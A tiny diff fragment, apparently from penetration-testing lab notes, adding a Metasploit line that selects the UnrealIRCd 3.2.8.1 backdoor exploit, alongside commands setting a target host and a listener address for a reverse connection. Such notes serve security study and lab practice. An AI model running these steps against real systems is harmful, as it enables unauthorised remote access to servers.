@@ -58,6 +58,7 @@ set RHOSTS 10.0.0.114
 exploit
 
 msf6 > search unrealircd
+use exploit/unix/irc/unreal_ircd_3281_backdoor
 set RHOSTS 10.0.0.114
 set LHOST 10.0.0.131
 show payloads
